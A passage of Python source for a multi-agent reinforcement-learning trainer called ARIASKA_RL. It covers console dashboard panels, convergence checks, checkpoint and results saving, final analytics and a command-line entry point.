            curves_content += f"Reward Trend: {trend} Latest: {recent_rewards[-1]:.2f}\n"
        
        # Loss trend
        recent_losses = list(self.learning_curves['loss_history'])[-20:]
        if len(recent_losses) >= 2:
            loss_trend = "↘️" if recent_losses[-1] < recent_losses[-5] else "↗️" if recent_losses[-1] > recent_losses[-5] else "➡️"
            curves_content += f"Loss Trend: {loss_trend} Latest: {recent_losses[-1]:.4f}\n"
        
        # Coordination trend
        recent_coord = list(self.learning_curves['coordination_history'])[-20:]
        if len(recent_coord) >= 2:
            coord_trend = "↗️" if recent_coord[-1] > recent_coord[-5] else "↘️" if recent_coord[-1] < recent_coord[-5] else "➡️"
            curves_content += f"Coordination: {coord_trend} Latest: {recent_coord[-1]:.2f}\n"
        
        # Simple ASCII chart for rewards
        if recent_rewards:
            curves_content += "\n[dim]Reward History (Last 20):[/dim]\n"
            max_reward = max(recent_rewards) if recent_rewards else 1
            min_reward = min(recent_rewards) if recent_rewards else 0
            range_reward = max_reward - min_reward if max_reward != min_reward else 1
            
            chart_line = ""
            for reward in recent_rewards[-10:]:  # Last 10 for chart
                normalized = (reward - min_reward) / range_reward
                if normalized > 0.7:
                    chart_line += "█"
                elif normalized > 0.4:
                    chart_line += "▆"
                elif normalized > 0.1:
                    chart_line += "▃"
                else:
                    chart_line += "▁"
            
            curves_content += f"[green]{chart_line}[/green]\n"
        
        # Memory usage statistics
        total_memory = sum(sizes[-1] if sizes else 0 
                          for sizes in self.training_metrics['memory_usage'].values())
        curves_content += f"\n[cyan]Total Memory: {total_memory} transitions[/cyan]"
        
        return Panel(
            curves_content,
            title="📈 Learning Curves & Analytics",
            border_style="blue",
            padding=(1, 1)
        )
    
    def _create_current_state_panel(self) -> Panel:
        """Create current training state panel."""
        state_content = "[bold]Current Training State[/bold]\n\n"
        
        # Latest agent actions
        state_content += "[cyan]Latest Agent Actions:[/cyan]\n"
        for agent_name in self.agent_names:
            recent_commands = self.training_metrics['commands_executed'][agent_name]
            if recent_commands:
                latest_command = recent_commands[-1]
                # Truncate long commands
                display_command = latest_command[:30] + "..." if len(latest_command) > 30 else latest_command
                state_content += f"{agent_name[:6]:>6}: {display_command}\n"
            else:
                state_content += f"{agent_name[:6]:>6}: [dim]No actions yet[/dim]\n"
        
        # Phase information
        recent_phases = self.training_metrics['phase_transitions']
        if recent_phases:
            latest_phase = recent_phases[-1]['to_phase']
            state_content += f"\n[yellow]Current Phase: {latest_phase.title()}[/yellow]\n"
        
        # GPT usage
        total_gpt_tokens = sum(self.training_metrics['gpt_usage'].values())
        state_content += f"[magenta]GPT Tokens Used: {total_gpt_tokens:,}[/magenta]\n"
        
        # Training efficiency
        if self.current_episode > 0:
            avg_reward_per_episode = sum(
                sum(rewards) for rewards in self.training_metrics['episode_rewards'].values()
            ) / (self.current_episode + 1)
            state_content += f"[green]Avg Reward/Episode: {avg_reward_per_episode:.2f}[/green]"
        
        return Panel(
            state_content,
            title="⚡ Current State",
            border_style="magenta",
            padding=(1, 1)
        )
    
    def _create_footer_panel(self) -> Panel:
        """Create footer panel with system status."""
        # System metrics
        memory_stats = self.memory_router.get_stats() if self.memory_router else {}
        total_transitions = memory_stats.get('total_transitions', 0)
        
        footer_content = f"""[dim]System Status: [green]●[/green] Active | Memory: {total_transitions:,} transitions | Models: Auto-save every {self.save_interval} episodes
Controls: Ctrl+C to stop gracefully | Logs: {self.log_dir} | Models: {self.model_dir}[/dim]"""
        
        return Panel(
            footer_content,
            border_style="dim",
            padding=(0, 1)
        )
    
    def _check_convergence(self) -> bool:
        """Check if training has converged (early stopping condition)."""
        # Simple convergence check based on reward stability
        if self.current_episode < 20:  # Need minimum episodes
            return False
        
        # Check if all agents have stable rewards
        for agent_name in self.agent_names:
            rewards = self.training_metrics['episode_rewards'][agent_name]
            if len(rewards) < 10:
                continue
            
            recent_rewards = rewards[-10:]
            if len(recent_rewards) < 10:
                continue
            
            # Check for stability (low variance)
            reward_std = np.std(recent_rewards)
            reward_mean = np.mean(recent_rewards)
            
            if reward_std > 0.5 or reward_mean < 1.0:  # Still learning
                return False
        
        # Check coordination stability
        recent_coord = self.training_metrics['coordination_scores'][-10:]
        if len(recent_coord) >= 10:
            coord_std = np.std(recent_coord)
            if coord_std > 0.1:  # Still improving coordination
                return False
        
        return True
    
    def _save_checkpoint(self, episode: int):
        """Save training checkpoint."""
        checkpoint_dir = self.model_dir / f"checkpoint_ep_{episode + 1}"
        checkpoint_dir.mkdir(exist_ok=True)
        
        # Save agent models
        for agent_name, agent in self.agents.items():
            if hasattr(agent, 'save'):
                try:
                    agent.save(checkpoint_dir / f"{agent_name}_model.pth")
                except Exception as e:
                    self.logger.warning(f"Failed to save {agent_name} model: {e}")
        
        # Save training metrics
        metrics_file = checkpoint_dir / "training_metrics.json"
        with open(metrics_file, 'w') as f:
            # Convert numpy arrays to lists for JSON serialization
            serializable_metrics = {}
            for key, value in self.training_metrics.items():
                if isinstance(value, dict):
                    serializable_metrics[key] = {k: list(v) if hasattr(v, '__iter__') and not isinstance(v, str) else v 
                                               for k, v in value.items()}
                else:
                    serializable_metrics[key] = list(value) if hasattr(value, '__iter__') and not isinstance(value, str) else value
            
            json.dump(serializable_metrics, f, indent=2, default=str)
        
        # Save coordination matrix
        coord_file = checkpoint_dir / "coordination_matrix.npy"
        np.save(coord_file, self.coordination_matrix)
        
        self.logger.info(f"Checkpoint saved at episode {episode + 1}")
    
    def _generate_final_analytics(self) -> Dict[str, Any]:
        """Generate comprehensive final analytics."""
        analytics = {
            'agent_performance': {},
            'coordination_metrics': {},
            'learning_analytics': {},
            'final_metrics': {}
        }
        
        # Agent performance analytics
        for agent_name in self.agent_names:
            rewards = self.training_metrics['episode_rewards'][agent_name]
            commands = self.training_metrics['commands_executed'][agent_name]
            losses = self.training_metrics['neural_losses'][agent_name]
            
            analytics['agent_performance'][agent_name] = {
                'total_reward': sum(rewards),
                'average_reward': np.mean(rewards) if rewards else 0.0,
                'reward_std': np.std(rewards) if rewards else 0.0,
                'total_commands': len(commands),
                'unique_commands': len(set(commands)),
                'command_diversity': len(set(commands)) / len(commands) if commands else 0.0,
                'final_epsilon': self.agents[agent_name].epsilon if hasattr(self.agents[agent_name], 'epsilon') else 0.0,
                'average_loss': np.mean(losses) if losses else 0.0,
                'learning_trend': 'improving' if len(losses) >= 10 and losses[-5:] < losses[-10:-5] else 'stable'
            }
        
        # Coordination analytics
        analytics['coordination_metrics'] = {
            'final_coordination_matrix': self.coordination_matrix.tolist(),
            'average_coordination': float(self.coordination_matrix.mean()),
            'max_coordination': float(self.coordination_matrix.max()),
            'coordination_improvement': float(
                np.mean(self.training_metrics['coordination_scores'][-10:]) - 
                np.mean(self.training_metrics['coordination_scores'][:10])
            ) if len(self.training_metrics['coordination_scores']) >= 20 else 0.0
        }
        
        # Learning analytics
        total_rewards = [sum(self.training_metrics['episode_rewards'][agent][-1:]) 
                        for agent in self.agent_names if self.training_metrics['episode_rewards'][agent]]
        
        analytics['learning_analytics'] = {
            'total_episodes_completed': self.current_episode + 1,
            'convergence_achieved': self._check_convergence(),
            'learning_efficiency': np.mean(total_rewards) if total_rewards else 0.0,
            'memory_utilization': sum(self.training_metrics['memory_usage'][agent][-1] 
                                    for agent in self.agent_names 
                                    if self.training_metrics['memory_usage'][agent]),
            'phase_transitions_count': len(self.training_metrics['phase_transitions']),
            'gpt_token_efficiency': sum(self.training_metrics['gpt_usage'].values()) / max(1, self.current_episode + 1)
        }
        
        # Final summary metrics
        analytics['final_metrics'] = {
            'avg_reward': np.mean([analytics['agent_performance'][agent]['average_reward'] 
                                 for agent in self.agent_names]),
            'coordination_score': analytics['coordination_metrics']['average_coordination'],
            'learning_success': analytics['learning_analytics']['convergence_achieved'],
            'training_efficiency': analytics['learning_analytics']['learning_efficiency'],
            'total_training_time': self.total_training_time
        }
        
        return analytics
    
    def _save_final_results(self, results: Dict[str, Any]):
        """Save final training results and analytics."""
        results_file = self.log_dir / f"final_results_{self.session_id}.json"
        
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        # Save coordination matrix
        coord_file = self.log_dir / f"final_coordination_matrix_{self.session_id}.npy"
        np.save(coord_file, self.coordination_matrix)
        
        # Save learning curves
        curves_file = self.log_dir / f"learning_curves_{self.session_id}.json"
        curves_data = {
            'reward_history': list(self.learning_curves['reward_history']),
            'loss_history': list(self.learning_curves['loss_history']),
            'coordination_history': list(self.learning_curves['coordination_history'])
        }
        
        with open(curves_file, 'w') as f:
            json.dump(curves_data, f, indent=2)
        
        # Generate human-readable summary
        summary_file = self.log_dir / f"training_summary_{self.session_id}.txt"
        with open(summary_file, 'w', encoding='utf-8') as f:
            f.write(f"ARIASKA_RL Unified Training Summary\n")
            f.write(f"===================================\n\n")
            f.write(f"Session ID: {self.session_id}\n")
            f.write(f"Training Duration: {self.total_training_time:.2f} seconds\n")
            f.write(f"Episodes Completed: {results['episodes_completed']}/{self.episodes}\n\n")
            
            f.write(f"Agent Performance:\n")
            f.write(f"-----------------\n")
            for agent_name in self.agent_names:
                perf = results['agent_performance'][agent_name]
                f.write(f"{agent_name}: Avg Reward: {perf['average_reward']:.2f}, "
                       f"Commands: {perf['total_commands']}, "
                       f"Diversity: {perf['command_diversity']:.2f}\n")
            
            f.write(f"\nCoordination Metrics:\n")
            f.write(f"--------------------\n")
            coord = results['coordination_metrics']
            f.write(f"Average Coordination: {coord['average_coordination']:.2f}\n")
            f.write(f"Maximum Coordination: {coord['max_coordination']:.2f}\n")
            f.write(f"Coordination Improvement: {coord['coordination_improvement']:.2f}\n")
            
            f.write(f"\nFinal Assessment:\n")
            f.write(f"----------------\n")
            final = results['final_metrics']
            f.write(f"Overall Success: {'YES' if final['learning_success'] else 'NO'}\n")
            f.write(f"Training Efficiency: {final['training_efficiency']:.2f}\n")
            f.write(f"Coordination Quality: {final['coordination_score']:.2f}\n")
        
        console.print(f"[green]📊 Results saved to {results_file}[/green]")
        console.print(f"[green]📈 Summary saved to {summary_file}[/green]")
        self.logger.info(f"Final results saved: {results_file}")


def create_unified_trainer(episodes: int = 100, **kwargs) -> UnifiedTrainingSystem:
    """
    Factory function to create a unified training system.
    
    This function provides CLI integration support.
    """
    return UnifiedTrainingSystem(episodes=episodes, **kwargs)


def main():
    """
    Main entry point for direct execution.
    Supports command line arguments for easy configuration.
    """
    import argparse
    
    parser = argparse.ArgumentParser(description="ARIASKA_RL Unified Training System")
    parser.add_argument("--episodes", type=int, default=100, help="Number of training episodes")
    parser.add_argument("--max-steps", type=int, default=50, help="Maximum steps per episode")
    parser.add_argument("--save-interval", type=int, default=10, help="Model save interval")
    parser.add_argument("--log-dir", type=str, default="logs/unified_training", help="Log directory")
    parser.add_argument("--model-dir", type=str, default="models/unified", help="Model directory")
    parser.add_argument("--session-id", type=str, help="Custom session ID")
    
    args = parser.parse_args()
    
    console.print(Panel(
        f"[bold cyan]🚀 ARIASKA_RL Unified Training System[/bold cyan]\n"
        f"Starting training with {args.episodes} episodes\n"
        f"Multi-agent coordination with DQN learning\n"
        f"Real-time visualization and comprehensive metrics",
        title="Training Initiation",
        border_style="green"
    ))
    
    try:
        # Create and run training system
        trainer = UnifiedTrainingSystem(
            episodes=args.episodes,
            max_steps_per_episode=args.max_steps,
            save_interval=args.save_interval,
            log_dir=args.log_dir,
            model_dir=args.model_dir,
            session_id=args.session_id
        )
        
        # Run training
        results = trainer.run_training()
        
        # Display final results
        console.print(Panel(
            f"[bold green]✅ Training Completed Successfully![/bold green]\n"
            f"Session: {results['session_id']}\n"
            f"Episodes: {results['episodes_completed']}\n"
            f"Duration: {results['total_training_time']:.2f}s\n"
            f"Final Score: {results['final_metrics']['avg_reward']:.2f}\n"
            f"Coordination: {results['final_metrics']['coordination_score']:.2f}",
            title="Training Complete",
            border_style="green"
        ))
        
        return results
        
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️ Training interrupted by user[/yellow]")
        return None
    except Exception as e:
        console.print(f"[red]❌ Training failed: {e}[/red]")
        raise


if __name__ == "__main__":
    main()
